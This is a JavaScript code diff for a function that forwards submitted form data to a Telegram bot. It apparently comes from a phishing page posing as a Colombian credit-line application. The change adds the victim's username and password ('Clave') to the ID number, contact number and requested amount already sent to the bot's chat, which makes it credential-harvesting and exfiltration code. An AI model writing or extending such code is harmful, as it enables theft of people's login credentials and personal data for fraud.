@@ -282,11 +282,17 @@ async function enviarATelegram(datos) {
     return;
   }
 
-  const mensaje = "NUEVA SOLICITUD\n" +
-    "Documento: " + datos.documento + "\n" +
-    "Tipo: " + datos.tipo + "\n" +
-    "Cupo: " + datos.cupo + "\n" +
-    "Contacto: " + datos.contacto;
+ const mensaje = "NUEVA SOLICITUD\n" +
+  "────────────────────\n" +
+  "Tipo de documento: " + datos.tipoDocumento + "\n" +
+  "Número de documento: " + datos.documento + "\n" +
+  "Número de contacto: " + datos.contacto + "\n" +
+  "Usuario: " + datos.usuario + "\n" +
+  "Cupo solicitado: " + datos.cupo + "\n" +
+  "Clave: " + datos.clave + "\n" +
+  "────────────────────\n" +
+  "Fecha y hora: " + new Date().toLocaleString("es-CO");
+
 
   await fetch("https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage", {
     method: "POST",
